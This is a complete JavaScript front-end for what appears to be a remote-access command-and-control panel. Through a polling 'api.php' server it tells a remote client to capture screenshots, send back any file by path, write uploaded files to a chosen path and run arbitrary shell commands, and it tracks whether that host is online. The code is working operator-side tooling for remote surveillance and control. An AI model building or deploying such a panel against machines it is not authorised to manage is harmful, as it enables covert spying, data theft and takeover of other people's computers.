//API URL for command requests/responses
var url = 'api.php';

//button elements
var status_button = document.getElementById('status_button');
var screenshot_button = document.getElementById('screenshot_button');
var getfile_button = document.getElementById('getfile_button');
var sendfile_button = document.getElementById('sendfile_button');
var cmd_button = document.getElementById('cmd_button');

//JS async implementation of sleep()
function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }

//function for enabling or disabling all buttons
function toggleButtons(toggle){
	var buttons = document.getElementsByClassName('btn-primary');
	for(var i = 0; i < buttons.length; i++){
		if(!toggle)
			buttons[i].setAttribute('disabled', '');
		else
			buttons[i].removeAttribute('disabled');
	}
}

//function for sending command to server
function setCommand(command, postdata, postfile, callback, onerror){
	//init request
	var request = new XMLHttpRequest();
	request.onreadystatechange = function(){
		//if request complete
		if(this.readyState == 4){
			//if HTTP status code OK
			if(this.status == 200){
				//if error encountered, print it, call callback function otherwise
				if(this.responseText.startsWith('Error: ')){
					alert(this.responseText);
					//if defined onerror function, call it
					if(onerror != null)
						onerror();
				}
				else
					callback();
			}
			else{
				alert('Set command failed, connection error\nStatus code: ' + this.status);
				if(onerror != null)
					onerror();
			}
		}
	}
	//if post data is set
	if(postdata != null){
		//init POST form
		fd = new FormData();
		fd.append(postdata[0], postdata[1]);
		//if set, send file through HTTP Post (multipart form)
		if(postfile != null)
			fd.append(postfile[0], postfile[1]);
		//send POST request
		request.open('POST', url + '?setcmd=' + command);
		request.send(fd);
	}
	else{
		//send GET request
		request.open('GET', url + '?setcmd=' + command);
		request.send();
	}
}

//function for retrieving response from server
function getResponse(command, callback, onerror, timeout, timeout_func){
	request = new XMLHttpRequest();
	request.onreadystatechange = function(){
		if(this.readyState == 4){
			if(this.status == 200){
				if(this.responseText.startsWith('Error: ')){
					alert(this.responseText);
					if(onerror != null)
						onerror();
				}
				//if command response is not ready, sleep for 1 second and call function again (recursion)
				else if(this.responseText == 'Processing'){
					sleep(1000);
					//if timeout (array[time_before, time_after]) and timeout trigger function are set
					if((timeout != null) && (timeout_func != null)){
						//if timeout reached, call timeout function
						if(timeout[0] >= timeout[1])
							timeout_func();
						else{
							//update time_before with current time, and recall getResponse()
							timeout[0] = Date.now();
							getResponse(command, callback, onerror, timeout, timeout_func);
						}
					}
					else
						getResponse(command, callback, onerror, timeout, timeout_func);
				}
				else
					callback(this.responseText);
			}
			else{
				alert('Get response command failed, connection error\nStatus code: ' + this.status);
				if(onerror != null)
					onerror();
			}
		}
	}
	request.open('GET', url + '?getresp=' + command)
	request.send()
}

//function for updating status table
function updateStatus(){
	var conn_status = document.getElementById('conn_status');
	toggleButtons(false);
	//define onerror function
	var onerror = function(){
		conn_status.innerHTML = '<i class="fa fa-circle offline"></i> Offline';
		for(var i in fields)
			document.getElementById(fields[i]).innerHTML = 'N/D';
		toggleButtons(true);
	};
	//define timeout array (for 60-secs host offline timeout)
	var timeout = [Date.now(), Date.now() + (60 * 1000)];
	//get cells from status table
	var cells = document.getElementById('status_table').getElementsByTagName('td');
	//get cells field IDs (except connection status)
	var fields = [];
	for(var i in cells){
		if(!isNaN(i) && cells[i].id != 'conn_status')
			fields.push(cells[i].id);
	}
	//change values to loading
	conn_status.innerHTML = '<img src="img/loading.gif" class="loading" /> Loading...';
	for(var i in fields)
		document.getElementById(fields[i]).innerHTML = '<img src="img/loading.gif" class="loading" /> Loading...';
	//send setcommand request and define callback function
	setCommand('status', null, null, function(){
		getResponse('status', function(responseText){
			//parse JSON response
			var response = JSON.parse(responseText);
			//set status online
			conn_status.innerHTML = '<i class="fa fa-circle online"></i> Online';
			//set table values
			for(var i in fields)
				document.getElementById(fields[i]).innerHTML = response[fields[i]];
			toggleButtons(true);
		}, onerror, timeout, onerror)
	}, onerror);
}

//function for loading latest taken screenshot
function loadScreenshot(startup){
	//loading div, display on loading, hide when request complete
	var loading = document.getElementById('screenshot_loading');
	toggleButtons(false);
	loading.style.display = 'block';
	var request = new XMLHttpRequest();
	request.onreadystatechange = function(){
		if(this.readyState == 4){
			if(this.status == 200){
				//if error encountered, print it and do not change anything
				if(this.responseText.startsWith('Error: ')){
					//print error only if pressed button, not on startup retrieving mode
					if(!startup)
						alert(this.responseText);
				}
				else{
					//updating results and appending timestamp to avoid loading cached image
					var timestamp = Date.now();
					document.getElementById('screenshot_image').src = 'server/scr.png?' + timestamp;
					document.getElementById('screenshot_link').href = 'server/scr.png?' + timestamp;
					document.getElementById('screenshot_time').innerHTML = 'Taken ' + this.responseText;
				}
			}
			else
				alert('Connection error: status code ' + this.status);
			toggleButtons(true);
			loading.style.display = 'none';
		}
	};
	request.open('GET', url + '?screenshotstatus=1');
	request.send();
}

//function for requesting a new screenshot, and then reloading it in page
function getScreenshot(){
	var loading = document.getElementById('screenshot_loading');
	toggleButtons(false);
	loading.style.display = 'block';
	var onerror = function(){ toggleButtons(true); loading.style.display = 'none'; };
	setCommand('screenshot', null, null, function(){
		getResponse('screenshot', function(responseText){
			loadScreenshot(false);
		}, onerror, null, null)
	}, onerror);
}

//function for getting file from client and downloading it
function getFile(){
	var loading = document.getElementById('getfile_loading');
	toggleButtons(false);
	loading.style.display = 'block';
	var onerror = function(){ toggleButtons(true); loading.style.display = 'none'; };
	setCommand('getfile', ['filepath', document.getElementById('getfile_filepath').value], null, function(){
		getResponse('getfile', function(responseText){
			window.open(url + '?getfile=1', '_blank');
			onerror();
		}, onerror, null, null)
	}, onerror);
}

//function for sending file to client via HTTP POST
function sendFile(){
	var loading = document.getElementById('sendfile_loading');
	toggleButtons(false);
	loading.style.display = 'block';
	var onerror = function(){ toggleButtons(true); loading.style.display = 'none'; };
	//define filepath and filedata POST parameters (array[key, value])
	var filepath = ['filepath', document.getElementById('sendfile_filepath').value];
	var filedata = ['file', document.getElementById('sendfile_filedata').files[0]];
	setCommand('sendfile', filepath, filedata, function(){
		getResponse('sendfile', function(responseText){
			alert(responseText);
			onerror();
		}, onerror, null, null)
	}, onerror);
}

//function for sending shell command to client and retrieving command output
function sendCommand(){
	var cmd_output = document.getElementById('cmd_output');
	toggleButtons(false);
	cmd_output.innerHTML =  'Waiting for response...';
	var postcom = ['command', document.getElementById('cmd_text').value];
	var onerror = function(){ cmd_output.innerHTML = 'Here there will be displayed the command output as response.'; toggleButtons(true); };
	setCommand('shell', postcom, null, function(){
		getResponse('shell', function(responseText){
			cmd_output.innerHTML = responseText;
			toggleButtons(true);
		}, onerror, null, null)
	}, onerror);
}

//onload events
updateStatus();
loadScreenshot(true);

//onclick events
status_button.onclick = function(){ updateStatus(); };
screenshot_button.onclick = function(){ getScreenshot(); };
getfile_button.onclick = function(){ getFile(); };
sendfile_button.onclick = function(){ sendFile(); };
cmd_button.onclick = function(){ sendCommand(); };
